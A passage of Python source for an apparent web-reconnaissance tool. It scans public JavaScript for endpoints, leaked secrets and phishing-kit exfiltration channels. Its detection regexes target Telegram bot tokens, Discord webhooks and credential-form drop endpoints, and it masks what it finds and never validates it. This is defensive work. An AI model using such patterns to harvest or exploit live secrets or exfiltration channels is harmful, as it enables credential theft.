"""JavaScript endpoints, secrets and phishing-kit channels (P068, batch p9-G03-1): one analysis library and
two opt-in modules, ``js_endpoints_archive`` (PASSIVE) and ``js_endpoints_live`` (LIGHT).

Final conditions (P068) and where they live:

1. Two modules over one library (:func:`analyse_js`, :func:`emit_analysis`), both
   ``default_enabled=False``. ``js_endpoints_archive``: JS bodies of Wayback ``id_`` snapshots (the
   P059 client's CDX + raw snapshot URLs), at most 10 files per entity. urlscan bodies already in a
   case are not reachable by a module (no case-data API): backlog p9-G03-1.
2. ``js_endpoints_live`` (LIGHT): same-origin ``<script src>`` files of analyst-typed seeds only.
3. It runs after the entity's passive lane and through the hostile-host guard (engine two-phase
   scheduling, P376) inside the LIGHT budget (core: 25 requests per target host per scan); files beyond
   the budget are listed 'not fetched: budget'. Fetches go through the safe-fetch helper
   (``light_fetch.safe_get``): same registrable domain (or a listed own CDN suffix) and inside the seed,
   at most 20 files x 2 MB, referenced source maps at most 5 MB.
4. Regex safety: the LinkFinder alternations are re-implemented as a linear tokenizer plus
   character-class checks (:func:`iter_quoted_segments`, :func:`classify_linkfinder`; the original
   regex is quadratic on long quoted runs), inline scripts are cut with a forward-only ``str.find``
   scan and form windows are bounded (hostile pages repeat unclosed tags), at most 2 MB scanned per
   file, and the tests run every pattern of this file on 2 MB adversarial inputs within 2 s. Secrets use the shared
   gitleaks engine of secret_scanner (P312: 217/222 rules compile in Python ``re``, RE2-only ones are
   rewritten there; it has its own ReDoS harness).
5. Secrets go through secret_scanner (P312): masked (first4...last4 + SHA-256) in findings, ``res.raw``
   and evidence; evidence keeps the JS URL, its SHA-256 and a redacted excerpt, never the raw body.
   Bodies of this module are never cached (``ttl=0``): a secret never reaches the HTTP cache.
6. A found secret is never validated or used (no getMe, webhook call or provider API, Lei 12.737/2012);
   third-party secrets produce a responsible-disclosure note, never pivots.
7. Phishing-kit exfiltration (Telegram Bot API URLs and chat ids, Discord webhooks, form-action / drop
   endpoints) are masked findings; pivots go to the endpoint host only, never to a token. A drop endpoint
   counts only when it leaves the site and a credential form posts there or a Telegram/Discord channel
   exists (:func:`kit_channels`): a site's own search/login forms and same-site POSTs are never
   exfiltration, and other cross-site form targets (newsletter, CRM) stay listed candidates without a
   finding or a pivot.
8. Extracted endpoints and paths are url entities with expand=False and are never requested;
   third-party domains are ``links_to`` with expand=False. Pivots are deduplicated and capped at 200;
   the report attribute groups endpoints by host, capped at 100.
9. Findings only for secrets matched by provider-specific rules; generic entropy-only matches are an
   info count (``secret_counts``). Tests: positive controls (aws-access-token, github-pat), jQuery
   3.7.1 with zero hits, the adversarial fixture.

LinkFinder (Gerben Javado, MIT) and jsluice (Bishop Fox, MIT) were read for the alternations and the
Firebase/kit matchers; no code was copied (notice fragment ``js_endpoints_design_refs``).
"""

from __future__ import annotations

import hashlib
import re
from collections.abc import Iterable, Iterator, Mapping
from typing import Any
from urllib.parse import urljoin, urlsplit

from v3lum.config import SettingSpec
from v3lum.core.entities import Entity
from v3lum.core.entities import EntityType as T
from v3lum.core.http import (
    AuthRequired,
    Blocked,
    DeadlineExceeded,
    HttpError,
    NetworkError,
    PolicyError,
    QuotaExceeded,
    RateLimited,
    RequestCapReached,
)
from v3lum.core.models import ModuleResult, Opsec
from v3lum.core.module import HealthCheck, HealthResult, Module, register
from v3lum.modules.url_web.archive_mining import parse_cdx_rows
from v3lum.modules.url_web.light_fetch import (
    attrs,
    base_for,
    check_target,
    internal_seed_hosts,
    seed_ports,
    fetch_homepage,
    header_first,
    load_json_text,
    looks_like_html,
    registrable,
    safe_get,
    same_site,
    to_text,
)
from v3lum.modules.url_web.web_archives import CDX, SRC_CDX, SRC_WAYBACK, archive_snapshot_url, failure, report_failure

__all__ = [
    "JsEndpointsArchive",
    "JsEndpointsLive",
    "analyse_js",
    "classify_linkfinder",
    "emit_analysis",
    "endpoint_noise_reason",
    "extract_endpoints",
    "extract_script_srcs",
    "find_source_map_url",
    "firebase_config",
    "group_endpoints",
    "iter_quoted_segments",
    "kit_channels",
    "kit_exfil_indicators",
    "parse_source_map",
]

MAX_JS_SCAN_BYTES = 2 * 1024 * 1024  # P068 c4
MAX_JS_FILES = 20  # P068 c3
MAX_ARCHIVE_FILES = 10  # P068 c1
MAX_SOURCE_MAP_BYTES = 5 * 1024 * 1024  # P068 c3
MAX_SOURCE_MAPS = 3
MAX_PIVOTS = 200  # P068 c8
MAX_REPORT = 100  # P068 c8
MAX_THIRD_PARTY = 50
MAX_LITERAL = 2048  # tokenizer cap per quoted segment
MAX_ENDPOINTS_PER_FILE = 1000  # distinct candidates kept per body (the pivots/report caps apply on top)
JS_ACCEPT = "application/javascript,text/javascript;q=0.9,*/*;q=0.5"
MAP_ACCEPT = "application/json,*/*;q=0.5"
KIT_RULES = ("v3lum-telegram-bot-token-url", "v3lum-telegram-bot-token-bare", "v3lum-discord-webhook-url", "v3lum-smtp-url-credentials",
             "v3lum-smtp-password-assignment", "v3lum-phpmailer-password")

# ======================================================================================
# LinkFinder alternations as linear checks (c4)
# ======================================================================================

_A2_FIRST_BAD = set("\"'><,;| *()%$^/\\[]")
# character-class checks as single-class regexes (C speed, no nested quantifier: linear, c4)
_A2_REST_BAD_RE = re.compile(r"[\"'><,;|()]")
_HEAD_RE = re.compile(r"[A-Za-z0-9_\-/]+")
_HEAD_DOT_RE = re.compile(r"[A-Za-z0-9_\-/.]+")
_NAME_RE = re.compile(r"[A-Za-z0-9_\-]+")
_TLD_AFTER_DOT_RE = re.compile(r".\.[A-Za-z]{2}")
_QUERY_TAIL_BAD_RE = re.compile(r"[\"'|]")
_QUOTE_CHARS_RE = re.compile(r"[\"'`]")
_EXT5 = {"php", "asp", "aspx", "jsp", "json", "action", "html", "js", "txt", "xml"}
_SCHEME_RE = re.compile(r"[a-zA-Z]{1,10}://")
_CLASSIFY_CACHE_MAX = 20_000  # distinct segments memoised per body (minified bundles repeat literals)


def _split_query(seg: str) -> tuple[str, str] | None:
    idx = len(seg)
    for ch in "?|#":
        j = seg.find(ch)
        if j != -1 and j < idx:
            idx = j
    head, tail = seg[:idx], seg[idx:]
    if tail and _QUERY_TAIL_BAD_RE.search(tail, 1):
        return None
    return head, tail


def classify_linkfinder(seg: str) -> str | None:
    """The five LinkFinder alternations on one quote-delimited segment, without backtracking:
    absolute_url | relative_path | relative_file | rest_endpoint | filename | None."""
    if not seg or "'" in seg or '"' in seg or ("/" not in seg and "." not in seg):
        return None  # every alternation needs a '/' or a '.': most literals of a bundle stop here
    found = _SCHEME_RE.match(seg)
    rest = seg[found.end():] if found else seg[2:] if seg.startswith("//") else None
    if rest is not None:
        auth = rest.split("/", 1)[0]
        if _TLD_AFTER_DOT_RE.search(auth):  # a '.' after at least one character, then two ASCII letters
            return "absolute_url"
    for pre in ("/", "../", "./"):
        if seg.startswith(pre):
            body = seg[len(pre):]
            if len(body) >= 2 and body[0] not in _A2_FIRST_BAD and not _A2_REST_BAD_RE.search(body, 1):
                return "relative_path"
            break
    split = _split_query(seg)
    if split is None or not split[0]:
        return None
    head = split[0]
    if "." in head and _HEAD_DOT_RE.fullmatch(head):
        dot = head.rfind(".")
        ext, stem = head[dot + 1:], head[:dot]
        if (ext == "action" or (1 <= len(ext) <= 4 and ext.isascii() and ext.isalpha())) and stem:
            first_dot = stem.find(".")
            limit = min(first_dot if first_dot != -1 else len(stem), len(stem) - 1)
            slash = stem.find("/", 1)
            if slash != -1 and slash < limit:
                return "relative_file"
    if _HEAD_RE.fullmatch(head):
        slash = head.find("/", 1)
        if slash != -1 and len(head) - slash - 1 >= 3:
            return "rest_endpoint"
    if head.count(".") == 1:
        name, ext = head.split(".")
        if name and _NAME_RE.fullmatch(name) and ext in _EXT5:
            return "filename"
    return None


def iter_quoted_segments(js: Any, *, max_bytes: int = MAX_JS_SCAN_BYTES, max_len: int = MAX_LITERAL,
                         quotes: str = "\"'`") -> Iterator[tuple[int, str, str | None]]:
    """Linear tokenizer with LinkFinder's finditer semantics (a matched closing quote is consumed):
    (start, segment, LinkFinder kind or None) for every run between two consecutive quote characters,
    at most 2 MB scanned; each distinct segment is classified once (memoised)."""
    text = to_text(js)[:max_bytes]
    if quotes == "\"'`":
        qpos = [m.start() for m in _QUOTE_CHARS_RE.finditer(text)]
    else:
        qpos = [i for i, ch in enumerate(text) if ch in quotes]
    memo: dict[str, str | None] = {}
    k = 0
    while k + 1 < len(qpos):
        i, j = qpos[k], qpos[k + 1]
        kind = None
        if 0 < j - i - 1 <= max_len:
            seg = text[i + 1:j]
            if seg in memo:
                kind = memo[seg]
            else:
                kind = classify_linkfinder(seg)
                if len(memo) < _CLASSIFY_CACHE_MAX:
                    memo[seg] = kind
            yield i, seg, kind
        k += 2 if kind is not None else 1


_MEDIA_TOP = ("application/", "audio/", "font/", "image/", "message/", "model/", "multipart/", "text/", "video/")
_DATE_RE = re.compile(r"\d{1,4}/\d{1,2}/\d{1,4}")
_MEDIA_RE = re.compile(r"[a-z]{1,20}/[a-z0-9.+\-]{1,80}(?:;.{0,100})?")


def endpoint_noise_reason(value: str) -> str | None:
    """IANA media types ('text/html'), dates, node_modules paths and protocol stubs; a blanket
    ``^[a-z]+/[a-z0-9.+-]+$`` filter would also drop real paths such as 'api/users'."""
    v = value.strip()
    low = v.lower()
    if low.startswith(_MEDIA_TOP) and _MEDIA_RE.fullmatch(low):
        return "media_type"
    if _DATE_RE.fullmatch(v):
        return "date"
    if "node_modules/" in low:
        return "node_modules"
    if low in ("//", "./", "../", "http://", "https://"):
        return "stub"
    return None


def extract_endpoints(js: Any, js_url: str, *, page_url: str | None = None, max_bytes: int = MAX_JS_SCAN_BYTES) -> dict[str, Any]:
    """Endpoints and paths of one JS body: candidates only (url entities with expand=False, never
    requested). Relative values resolve against the page (fetch() is relative to the document) or
    the JS URL."""
    text = to_text(js)
    base = page_url or js_url
    out: list[dict[str, str]] = []
    seen: set[str] = set()
    dropped: dict[str, int] = {}
    capped = False
    noise_seen: dict[str, str] = {}
    for _pos, seg, kind in iter_quoted_segments(text, max_bytes=max_bytes):
        if not kind or seg in seen:
            continue
        if len(out) >= MAX_ENDPOINTS_PER_FILE:
            capped = True
            break
        noise = noise_seen.get(seg) or endpoint_noise_reason(seg)
        if noise:
            if len(noise_seen) < _CLASSIFY_CACHE_MAX:
                noise_seen[seg] = noise
            dropped[noise] = dropped.get(noise, 0) + 1
            continue
        seen.add(seg)
        try:
            url = ("https:" + seg if seg.startswith("//") else seg) if kind == "absolute_url" else urljoin(base, seg)
            parts = urlsplit(url)
        except ValueError:
            dropped["unparsable"] = dropped.get("unparsable", 0) + 1
            continue
        if parts.scheme not in ("http", "https") or not parts.hostname:
            dropped["non_http"] = dropped.get("non_http", 0) + 1
            continue
        masked, changed = _mask_url(url[:2048])
        out.append({"value": masked[:500] if changed else seg[:500], "kind": kind, "url": masked, "host": parts.hostname.lower(),
                    "masked": changed})
    return {"endpoints": out, "dropped": dropped, "scanned_bytes": min(len(text), max_bytes), "truncated": len(text) > max_bytes,
            "capped": capped}


#: kit tokens the core detectors miss inside URLs ('bot<id>:AA...' has no word boundary before the id)
_TG_TOKEN_ANY_RE = re.compile(r"\d{5,16}:AA[A-Za-z0-9_-]{30,40}")
_DISCORD_TOKEN_RE = re.compile(r"(/webhooks/)\d{15,21}/[A-Za-z0-9_-]{50,100}")


def _mask_url(url: str) -> tuple[str, bool]:
    """Secrets, tokens, e-mail addresses and key-like parameters of an endpoint URL masked before it is
    stored (the P059/P060 archive masking, the core secret detectors and the kit-token patterns):
    (URL, anything masked)."""
    changed = False
    text = url
    for rx, repl in ((_TG_TOKEN_ANY_RE, "[REDACTED]"), (_DISCORD_TOKEN_RE, r"\1[REDACTED]")):
        text, n = rx.subn(repl, text)
        changed = changed or bool(n)
    try:
        from v3lum.modules.url_web.archive_mining import mask_harvested_url

        masked, more = mask_harvested_url(text)
        return masked, changed or more
    except Exception:  # noqa: BLE001 - masking unavailable: never keep the URL (fail closed)
        return "[unmaskable URL]", True


def group_endpoints(endpoints: Iterable[Mapping[str, str]], site_host: str, *, cap_pivots: int = MAX_PIVOTS,
                    cap_report: int = MAX_REPORT) -> dict[str, Any]:
    """c8: same-site endpoint URLs (deduplicated, at most 200), third-party registrable domains, and the
    report list grouped by host (at most 100 entries)."""
    pivots: list[str] = []
    third: dict[str, int] = {}
    by_host: dict[str, list[str]] = {}
    seen: set[str] = set()
    shown = 0
    for e in endpoints:
        url, host = e["url"], e["host"]
        if url in seen:
            continue
        seen.add(url)
        if same_site(host, site_host):
            if len(pivots) < cap_pivots and not e.get("masked"):  # a masked value is no indicator: report only
                pivots.append(url)
        else:
            dom = registrable(host)
            third[dom] = third.get(dom, 0) + 1
        if shown < cap_report:
            parts = urlsplit(url)
            by_host.setdefault(host, []).append((parts.path or "/") + (f"?{parts.query}" if parts.query else ""))
            shown += 1
    return {"pivots": pivots, "third_party": third, "by_host": by_host, "total": len(seen),
            "capped": len(seen) > cap_report or len(pivots) >= cap_pivots}


# ======================================================================================
# pages, scripts and source maps (c2, c3)
# ======================================================================================

_SCRIPT_TAG_RE = re.compile(r"<script\b[^<>]{0,2048}>", re.I)
_SRC_ATTR_RE = re.compile(r"\bsrc\s*=", re.I)
MAX_INLINE_BLOCK = 262_144  # one inline <script> block read at most


def extract_script_srcs(html: Any, page_url: str, *, cdn_suffixes: Iterable[str] = (), max_files: int = MAX_JS_FILES) -> dict[str, Any]:
    """``<script src>`` of a page: same registrable domain (or a listed own CDN suffix) -> fetchable
    (at most ``max_files``; the rest 'not fetched: budget'); other hosts -> third party (links_to,
    never fetched); data:/javascript:/blob: skipped."""
    text = to_text(html, 2 * 1024 * 1024)
    base = base_for(text, page_url)
    page_host = urlsplit(page_url).hostname or ""
    cdns = [str(s).lower().strip(".") for s in cdn_suffixes if str(s).strip()]
    same: list[str] = []
    third: list[str] = []
    skipped: list[dict[str, str]] = []
    seen: set[str] = set()
    inline = 0
    for found in _SCRIPT_TAG_RE.finditer(text):
        src = attrs(found.group(0)).get("src")
        if not src:
            inline += 1
            continue
        if src.lower().startswith(("data:", "javascript:", "blob:")):
            skipped.append({"src": src[:40], "reason": "non-http script source"})
            continue
        try:
            url = urljoin(base, src)
            parts = urlsplit(url)
        except ValueError:
            skipped.append({"src": src[:200], "reason": "unparsable src"})
            continue
        if parts.scheme not in ("http", "https"):
            skipped.append({"src": src[:200], "reason": f"scheme {parts.scheme or 'none'}"})
            continue
        if url in seen:
            continue
        seen.add(url)
        host = (parts.hostname or "").lower()
        if same_site(host, page_host) or any(host == s or host.endswith("." + s) for s in cdns):
            same.append(url)
        else:
            third.append(url)
    return {"fetch": same[:max_files], "not_fetched_budget": same[max_files:], "third_party": third, "inline_scripts": inline, "skipped": skipped}


def inline_scripts(html: Any) -> str:
    """The text of the page's inline ``<script>`` blocks (bounded), for the same analysis.

    A linear scan with ``str.find`` (c4): every ``<script`` start is examined once and the search for
    its ``</script`` close moves forward only; when no close is left the scan stops. (A lazy regex over
    ``.{0,262144}?`` rescans up to 256 KB from every unclosed ``<script>`` - quadratic on a hostile page
    of repeated unclosed tags.)"""
    text = to_text(html, 2 * 1024 * 1024)
    low = text.lower()
    out: list[str] = []
    total = 0
    pos = 0
    while total < MAX_JS_SCAN_BYTES:
        start = low.find("<script", pos)
        if start == -1:
            break
        after = low[start + 7:start + 8]
        if after and (after.isalnum() or after in "_-:"):
            pos = start + 7  # '<scripts', '<script-x>': not a script tag
            continue
        end_tag = low.find(">", start, start + 2048)
        lt = low.find("<", start + 1, end_tag if end_tag != -1 else start + 2048)
        if end_tag == -1 or lt != -1:
            pos = start + 7
            continue
        close = low.find("</script", end_tag + 1)
        if close == -1:
            break  # no closing tag anywhere after this point: nothing more to read
        if not _SRC_ATTR_RE.search(text[start:end_tag]) and close - end_tag - 1 <= MAX_INLINE_BLOCK:
            block = text[end_tag + 1:close]
            out.append(block)
            total += len(block) + 1
        pos = close + 8
    return "\n".join(out)[:MAX_JS_SCAN_BYTES]


def find_source_map_url(js: Any, js_url: str, headers: Any = None) -> dict[str, Any] | None:
    """The referenced source map: SourceMap/X-SourceMap header, else the last ``sourceMappingURL``
    comment; inline data: maps are reported as inline (no request)."""
    for name in ("sourcemap", "x-sourcemap"):
        value = header_first(headers, name) if headers is not None else None
        if value:
            return {"url": urljoin(js_url, value.strip()), "inline": False, "source": "header"}
    tail = to_text(js)[-4096:]
    refs = list(re.finditer(r"[#@]\s*sourceMappingURL\s*=\s*([^\s'\"*]{1,2048})", tail))
    if not refs:
        return None
    value = refs[-1].group(1)
    if value.lower().startswith("data:"):
        return {"url": None, "inline": True, "source": "comment"}
    try:
        return {"url": urljoin(js_url, value), "inline": False, "source": "comment"}
    except ValueError:
        return None


def parse_source_map(obj: Any, *, max_bytes: int = MAX_SOURCE_MAP_BYTES) -> dict[str, Any]:
    """Source map JSON (<= 5 MB) -> original source paths (internal path disclosure) and whether
    sourcesContent is embedded (scanned like a JS body, never stored raw)."""
    if isinstance(obj, (bytes, str)) and len(obj) > max_bytes:
        return {"ok": False, "reason": "larger than 5 MB"}
    data = load_json_text(obj)
    if not isinstance(data, dict) or not isinstance(data.get("sources"), list):
        return {"ok": False, "reason": "not a source map"}
    sources = []
    for s in data["sources"]:
        if isinstance(s, str):
            sources.append(re.sub(r"^(?:webpack|vite|rollup)://+[^/]*?/?", "", s)[:300].lstrip("./"))
    contents = data.get("sourcesContent")
    text = "\n".join(c for c in contents if isinstance(c, str)) if isinstance(contents, list) else ""
    return {"ok": True, "reason": None, "version": data.get("version"), "sources": sources, "n_sources": len(sources),
            "has_sources_content": bool(text.strip()), "node_modules": sum(1 for s in sources if "node_modules/" in s),
            "sources_content": text[:MAX_JS_SCAN_BYTES]}


# ======================================================================================
# phishing-kit channels and Firebase facts (c7; jsluice ideas)
# ======================================================================================

_TG_URL_RE = re.compile(r"api\.telegram\.org/(?:file/)?bot(\d{5,16}:[A-Za-z0-9_-]{30,40})(?:/([A-Za-z]{1,40}))?")
_TG_CHAT_RE = re.compile(r"chat_?id[\"'\]\s]{0,3}[:=,]{1,2}[\s\"'(]{0,3}(-?\d{5,16})", re.I)
_DISCORD_RE = re.compile(r"https?://(?:(?:ptb|canary)\.)?discord(?:app)?\.com/api/(?:v\d{1,2}/)?webhooks/(\d{15,21})/([A-Za-z0-9_-]{50,100})")
_POST_TARGET_RES = (
    re.compile(r"\$\.post\(\s*[\"'`]([^\"'`\s]{1,2048})[\"'`]"),
    re.compile(r"\.open\(\s*[\"']POST[\"']\s*,\s*[\"'`]([^\"'`\s]{1,2048})[\"'`]", re.I),
    re.compile(r"\$\.ajax\(\s*\{[^{}]{0,400}?url\s*:\s*[\"'`]([^\"'`\s]{1,2048})[\"'`]"),
    re.compile(r"fetch\(\s*[\"'`]([^\"'`\s]{1,2048})[\"'`]\s*,\s*\{[^{}]{0,300}?method\s*:\s*[\"']POST", re.I),
)
_FORM_TAG_RE = re.compile(r"<form\b[^<>]{0,2048}>", re.I)


def _mask(value: str, rule: str) -> dict[str, Any]:
    from v3lum.modules.utility.secret_scanner import mask_secret

    return mask_secret(value, rule)


def kit_exfil_indicators(text: Any, base_url: str | None = None, *, max_bytes: int = MAX_JS_SCAN_BYTES) -> list[dict[str, Any]]:
    """c7: exfiltration channels of a phishing kit. Telegram bot tokens/chat ids and Discord webhooks
    come back masked (never the raw value); drop endpoints (``$.post``, ``xhr.open('POST')``,
    ``$.ajax({url})``, ``fetch(..., POST)``, ``<form action>``) as masked URLs (``credential_form``
    when the form holds a password field). A drop URL that embeds a Telegram/Discord token is reported
    only by its masked token, never repeated as a URL. Drop endpoints alone are candidates: whether
    they count as exfiltration is decided against the site (:func:`kit_channels`)."""
    t = to_text(text)[:max_bytes]
    out: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()

    def add(item: dict[str, Any], key: tuple[str, str]) -> None:
        if key not in seen:
            seen.add(key)
            out.append(item)

    tg_tokens = list(_TG_URL_RE.finditer(t))
    for m in tg_tokens:
        add({"kind": "telegram_bot_api", "host": "api.telegram.org", "method": m.group(2), "token": _mask(m.group(1), "telegram-bot-token")},
            ("tg", hashlib.sha256(m.group(1).encode()).hexdigest()))
    # a bare 'chat_id' is a Telegram channel only next to Telegram code (chat widgets use the name too)
    telegram_context = bool(tg_tokens) or "telegram" in t.lower() or bool(_TG_TOKEN_ANY_RE.search(t))
    for m in _TG_CHAT_RE.finditer(t) if telegram_context else ():
        add({"kind": "telegram_chat_id", "host": "api.telegram.org", "chat_id": _mask(m.group(1), "telegram-chat-id")},
            ("chat", hashlib.sha256(m.group(1).encode()).hexdigest()))
    for m in _DISCORD_RE.finditer(t):
        add({"kind": "discord_webhook", "host": "discord.com", "webhook_id": _mask(m.group(1), "discord-webhook-id"),
             "token": _mask(m.group(2), "discord-webhook-token")}, ("dc", hashlib.sha256(m.group(2).encode()).hexdigest()))
    for rx in _POST_TARGET_RES:
        for m in rx.finditer(t):
            target = m.group(1)
            if _TG_URL_RE.search(target) or _DISCORD_RE.search(target):
                continue
            try:
                url = urljoin(base_url, target) if base_url else target
                host = (urlsplit(url).hostname or "").lower()
            except ValueError:
                continue
            add({"kind": "post_target", "url": _mask_url(url[:2048])[0], "host": host}, ("post", url))
    for n_form, m in enumerate(_FORM_TAG_RE.finditer(t)):
        if n_form >= MAX_FORMS:
            break  # hostile pages repeat tags: a bounded number of forms, each with a bounded window (c4)
        tag = attrs(m.group(0))
        action = tag.get("action")
        if not action or action.lower().startswith(("javascript:", "#")) or _TG_URL_RE.search(action) or _DISCORD_RE.search(action):
            continue
        try:
            url = urljoin(base_url, action) if base_url else action
            host = (urlsplit(url).hostname or "").lower()
        except ValueError:
            continue
        inner = t[m.end():m.end() + FORM_WINDOW]
        end = inner.lower().find("</form")
        credential = bool(_PASSWORD_INPUT_RE.search(inner if end == -1 else inner[:end]))
        add({"kind": "form_action", "url": _mask_url(url[:2048])[0], "method": (tag.get("method") or "get").lower(), "host": host,
             "credential_form": credential}, ("form", url))
    return out[:50]


MAX_FORMS = 200  # <form> tags examined per body
FORM_WINDOW = 16_384  # characters after a <form> tag searched for its password field
_PASSWORD_INPUT_RE = re.compile(r"<input\b[^<>]{0,512}\btype\s*=\s*[\"']?password", re.I)
#: kinds that are exfiltration channels by themselves (c7)
STRONG_KIT_KINDS = frozenset({"telegram_bot_api", "telegram_chat_id", "discord_webhook"})


def kit_channels(indicators: Iterable[Mapping[str, Any]], site_host: str) -> dict[str, list[dict[str, Any]]]:
    """c7 against the site: Telegram/Discord channels always count; a drop endpoint counts only when it
    leaves the site (another registrable domain) and either a credential form posts there or a
    Telegram/Discord channel exists in the same scripts. Same-site form actions and POST targets are the
    site's own endpoints (a search box, a login form), never exfiltration; other cross-site targets
    (newsletter or CRM forms) stay listed as unconfirmed candidates, without a finding or a pivot."""
    strong: list[dict[str, Any]] = []
    credential: list[dict[str, Any]] = []
    cross: list[dict[str, Any]] = []
    for k in indicators:
        kind = str(k.get("kind") or "")
        if kind in STRONG_KIT_KINDS:
            strong.append(dict(k))
            continue
        host = str(k.get("host") or "")
        if not host or same_site(host, site_host):
            continue
        (credential if k.get("credential_form") else cross).append(dict(k))
    if strong or credential:
        return {"channels": strong + credential + cross, "candidates": []}
    return {"channels": [], "candidates": cross}


_FIREBASE_RE = re.compile(r"projectId\s*:\s*[\"']([a-z0-9-]{4,40})[\"']")


def firebase_config(text: Any) -> dict[str, Any] | None:
    """jsluice idea: a Firebase web config object -> project facts; the apiKey (public by design) is
    still masked."""
    t = to_text(text)[:MAX_JS_SCAN_BYTES]
    found = _FIREBASE_RE.search(t)
    if not found:
        return None
    window = t[max(0, found.start() - 600): found.end() + 600]

    def grab(key: str) -> str | None:
        m = re.search(key + r"\s*:\s*[\"']([^\"'\s]{1,200})[\"']", window)
        return m.group(1) if m else None

    api = grab("apiKey")
    return {"project_id": found.group(1), "auth_domain": grab("authDomain"), "storage_bucket": grab("storageBucket"),
            "api_key": _mask(api, "gcp-api-key") if api else None}


# ======================================================================================
# one body -> facts (c4-c7, c9)
# ======================================================================================

def _redacted_excerpt(lines: list[str], line_no: int, masked: Mapping[str, Any] | None, width: int = 60) -> str | None:
    """c5: a short excerpt of the line around the secret, the secret replaced by '[REDACTED]' (located
    by its masked preview and length, confirmed by its SHA-256) and passed through the core scrubber;
    None when the secret cannot be located (no excerpt is safer than a guess)."""
    masked = masked or {}
    digest, display, length = masked.get("sha256"), str(masked.get("display") or ""), masked.get("length")
    if not digest or "…" not in display or not isinstance(length, int) or length < 8 or not 0 < line_no <= len(lines):
        return None
    first, last = display.split("…", 1)
    line = lines[line_no - 1][:50_000]
    pattern = re.compile(re.escape(first) + ".{" + str(max(0, length - len(first) - len(last))) + "}" + re.escape(last), re.S)
    for found in pattern.finditer(line):
        if hashlib.sha256(found.group(0).encode("utf-8", "surrogatepass")).hexdigest() != digest:
            continue
        excerpt = line[max(0, found.start() - width):found.start()] + "[REDACTED]" + line[found.end():found.end() + width]
        try:
            from v3lum.core.sanitize import scrub_text

            excerpt = scrub_text(excerpt)
        except Exception:  # noqa: BLE001 - the scrubber is defence in depth
            pass
        return re.sub(r"[\x00-\x08\x0b-\x1f\x7f]", " ", excerpt)[: 2 * width + 40]
    return None


def analyse_js(text: Any, js_url: str, *, page_url: str | None = None, source: str = "live") -> dict[str, Any]:
    """Endpoints, secrets (secret_scanner, masked), kit channels, Firebase facts and the source-map
    reference of one JS body. Never returns the raw body or a raw secret."""
    body = to_text(text)[:MAX_JS_SCAN_BYTES]
    sha = hashlib.sha256(to_text(text).encode("utf-8", "surrogatepass")).hexdigest()
    endpoints = extract_endpoints(body, js_url, page_url=page_url)
    secrets: list[dict[str, Any]] = []
    generic = 0
    try:
        from v3lum.modules.utility.secret_scanner import scan_text

        scanned = scan_text(body, path=js_url, max_bytes=MAX_JS_SCAN_BYTES)
    except Exception:  # noqa: BLE001 - the shared engine unavailable: endpoints still count
        scanned = {"findings": []}
    lines = body.split("\n")
    for item in scanned.get("findings") or []:
        if item.get("generic"):
            generic += 1
            continue
        masked = item.get("masked") or {}
        loc = (item.get("locations") or [{}])[0]
        secrets.append({
            "rule": item["rule_id"], "kind": item.get("kind"), "description": item.get("description"), "masked": masked,
            "locations": [{"path": js_url, "line": x.get("line")} for x in item.get("locations") or []][:5],
            "count": item.get("count", 1), "kit": item["rule_id"] in KIT_RULES,
            "excerpt": _redacted_excerpt(lines, int(loc.get("line") or 0), masked),
        })
    return {
        "url": js_url, "sha256": sha, "bytes": len(to_text(text)), "source": source, "truncated": endpoints["truncated"],
        "endpoints": endpoints["endpoints"], "dropped": endpoints["dropped"], "secrets": secrets, "generic_secrets": generic,
        "kit": kit_exfil_indicators(body, page_url or js_url), "firebase": firebase_config(body),
        "source_map": find_source_map_url(body, js_url),
    }


def _owner(ctx: Any, entity: Entity) -> str:
    try:
        return "own" if bool(getattr(ctx.org.owns(entity), "own", False)) else "third_party"
    except Exception:  # noqa: BLE001
        return "third_party"


def emit_analysis(res: ModuleResult, analyses: list[dict[str, Any]], *, site_host: str, owner: str, source_id: str = "",
                  extra_files: Mapping[str, Any] | None = None) -> None:
    """Pivots, attributes and findings of every analysed body (c5-c9)."""
    from v3lum.modules.utility.secret_scanner import secret_severity

    all_endpoints = [e for a in analyses for e in a["endpoints"]]
    grouped = group_endpoints(all_endpoints, site_host)
    for url in grouped["pivots"]:
        res.pivot(T.URL, url, "js_endpoint", confidence="possible", expand=False,
                  note="endpoint/path found in public JavaScript: listed, never requested (API probing is ACTIVE-only)")
    for dom in sorted(grouped["third_party"], key=lambda d: -grouped["third_party"][d])[:MAX_THIRD_PARTY]:
        res.pivot(T.DOMAIN, dom, "links_to", confidence="possible", expand=False, note="third-party host referenced by the site's JavaScript")
    if grouped["total"]:
        res.attr("js_endpoints", {"by_host": grouped["by_host"], "total": grouped["total"], "capped": grouped["capped"],
                                  "third_party_domains": dict(sorted(grouped["third_party"].items())[:MAX_THIRD_PARTY])})
    files = [{"url": a["url"], "sha256": a["sha256"], "bytes": a["bytes"], "source": a["source"], "truncated": a["truncated"],
              "endpoints": len(a["endpoints"]), "secrets": len(a["secrets"]), "kit": len(a["kit"])} for a in analyses]
    res.attr("js_files", {"files": files, **dict(extra_files or {})})
    counts: dict[str, int] = {}
    for a in analyses:
        for s in a["secrets"]:
            counts[s["rule"]] = counts.get(s["rule"], 0) + 1
        if a["generic_secrets"]:
            counts["generic-api-key"] = counts.get("generic-api-key", 0) + a["generic_secrets"]
    if counts:
        res.attr("secret_counts", counts)  # generic entropy-only matches stay a count (c9)
    fire = next((a["firebase"] for a in analyses if a.get("firebase")), None)
    if fire:
        res.attr("js_firebase", fire)
    # ---- secrets: one finding per distinct secret, masked, never validated (c5, c6, c9) ----
    seen: set[str] = set()
    evidence: list[dict[str, Any]] = []
    for a in analyses:
        for s in a["secrets"]:
            key = str((s["masked"] or {}).get("sha256") or f"{s['rule']}@{a['url']}")
            if key in seen:
                continue
            seen.add(key)
            who = "attacker_infra" if s["kit"] else owner
            sev = secret_severity(s["rule"], who, generic=False)
            note = ("Notify the credential owner through a manual, approved responsible-disclosure process; never test or use it."
                    if who == "third_party" else sev["recommendation"])
            res.finding(
                f"Secret in public JavaScript: {s['rule']}",
                sev["severity"],
                f"{s.get('description') or s['rule']}: {(s['masked'] or {}).get('display', '[redacted]')} in {a['url']} "
                f"({s['count']} location(s)). The value is masked and was never validated or used. {note}",
                confidence="probable",
                criterion=f"secret_scanner rule '{s['rule']}' (gitleaks, MIT) matched public JavaScript; format only, never validated "
                          "(P068 c5, c6; P312)",
                data={"rule": s["rule"], "kind": s["kind"], "masked": s["masked"], "locations": s["locations"], "generic": False,
                      "owner": who, "js_url": a["url"], "js_sha256": a["sha256"]},
